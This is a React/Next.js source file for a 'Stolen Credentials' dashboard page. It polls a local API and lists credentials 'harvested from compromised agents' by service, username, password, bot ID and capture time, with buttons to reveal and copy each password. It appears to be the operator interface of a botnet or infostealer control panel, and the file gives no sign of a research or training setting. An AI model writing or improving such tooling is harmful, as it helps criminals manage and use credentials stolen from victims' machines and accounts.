"use client";

import { useState, useMemo, useEffect, useCallback, Suspense } from "react";
import { Copy, Eye, EyeOff, Filter, X } from "lucide-react";
import { format } from "date-fns";
import { useSearchParams, useRouter } from "next/navigation";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Credential } from "@/types/types";
import { toast } from "sonner";

function CredentialsContent() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const initialBotId = searchParams.get("botId");

  // eslint-disable-next-line @typescript-eslint/no-unused-vars -- Will be used when API is implemented
  const [credentials, setCredentials] = useState<Credential[]>([]);
  const [visiblePasswords, setVisiblePasswords] = useState<Set<string>>(
    new Set(),
  );
  const [filterBotId, setFilterBotId] = useState(initialBotId || "");

  const fetchCredentials = useCallback(async () => {
    try {
      const response = await fetch("http://localhost:8080/api/credentials");
      if (response.ok) {
        const data = await response.json();
        setCredentials(data);
      }
    } catch (error) {
      console.error("Failed to fetch credentials:", error);
    }
  }, []);

  useEffect(() => {
    fetchCredentials();
    const interval = setInterval(fetchCredentials, 30000);
    return () => clearInterval(interval);
  }, [fetchCredentials]);

  const filteredCredentials = useMemo(() => {
    if (!filterBotId) return credentials;
    return credentials.filter((c) =>
      c.botId.toLowerCase().includes(filterBotId.toLowerCase()),
    );
  }, [credentials, filterBotId]);

  const togglePasswordVisibility = (id: string) => {
    setVisiblePasswords((prev) => {
      const next = new Set(prev);
      if (next.has(id)) {
        next.delete(id);
      } else {
        next.add(id);
      }
      return next;
    });
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied to clipboard");
  };

  const clearFilter = () => {
    setFilterBotId("");
    router.replace("/credentials");
  };

  const updateFilter = (val: string) => {
    setFilterBotId(val);
    if (val) {
      router.replace(`/credentials?botId=${val}`);
    } else {
      router.replace("/credentials");
    }
  };

  return (
    <div className="flex min-h-screen flex-col">
      <main className="flex flex-1 flex-col gap-4 p-4 md:gap-8 md:p-8 bg-muted/20">
        <div className="grid gap-4 md:gap-8">
          <Card>
            <CardHeader className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
              <div>
                <CardTitle>Stolen Credentials</CardTitle>
                <CardDescription>
                  Credentials harvested from compromised agents.
                </CardDescription>
              </div>
              <div className="flex items-center gap-2 w-full md:w-auto">
                <div className="relative flex items-center max-w-[300px] w-full">
                  <Filter className="absolute left-2.5 h-4 w-4 text-muted-foreground" />
                  <Input
                    placeholder="Filter by Bot ID..."
                    className="pl-9 pr-9"
                    value={filterBotId}
                    onChange={(e) => updateFilter(e.target.value)}
                  />
                  {filterBotId && (
                    <Button
                      variant="ghost"
                      size="icon"
                      className="absolute right-0 h-9 w-9 hover:bg-transparent"
                      onClick={clearFilter}
                    >
                      <X className="h-4 w-4 text-muted-foreground hover:text-foreground" />
                    </Button>
                  )}
                </div>
                <Badge
                  variant="outline"
                  className="font-mono h-9 flex items-center justify-center px-4"
                >
                  {filteredCredentials.length} / {credentials.length} Records
                </Badge>
              </div>
            </CardHeader>
            <CardContent>
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Service / URL</TableHead>
                    <TableHead>Username</TableHead>
                    <TableHead>Password</TableHead>
                    <TableHead>Captured From</TableHead>
                    <TableHead className="text-right">Time</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filteredCredentials.map((cred) => (
                    <TableRow key={cred.id}>
                      <TableCell>
                        <div className="font-medium">{cred.service}</div>
                        <div className="text-xs text-muted-foreground truncate max-w-[200px]">
                          {cred.url}
                        </div>
                      </TableCell>
                      <TableCell className="font-mono text-sm">
                        {cred.username}
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          <code className="relative rounded bg-muted px-[0.3rem] py-[0.2rem] font-mono text-sm font-semibold">
                            {visiblePasswords.has(cred.id)
                              ? cred.passwordValue
                              : "••••••••"}
                          </code>
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-6 w-6"
                            onClick={() => togglePasswordVisibility(cred.id)}
                          >
                            {visiblePasswords.has(cred.id) ? (
                              <EyeOff className="h-3 w-3" />
                            ) : (
                              <Eye className="h-3 w-3" />
                            )}
                          </Button>
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-6 w-6"
                            onClick={() => copyToClipboard(cred.passwordValue)}
                          >
                            <Copy className="h-3 w-3" />
                          </Button>
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge variant="outline" className="font-mono">
                          {cred.botId}
                        </Badge>
                      </TableCell>
                      <TableCell className="text-right text-muted-foreground text-sm">
                        {format(new Date(cred.capturedAt), "MMM d, HH:mm")}
                      </TableCell>
                    </TableRow>
                  ))}
                  {filteredCredentials.length === 0 && (
                    <TableRow>
                      <TableCell
                        colSpan={5}
                        className="text-center py-8 text-muted-foreground"
                      >
                        {credentials.length === 0
                          ? "No credentials captured yet."
                          : "No credentials found for this filter."}
                      </TableCell>
                    </TableRow>
                  )}
                </TableBody>
              </Table>
            </CardContent>
          </Card>
        </div>
      </main>
    </div>
  );
}

export default function CredentialsPage() {
  return (
    <Suspense fallback={<div className="p-8 text-center">Loading...</div>}>
      <CredentialsContent />
    </Suspense>
  );
}
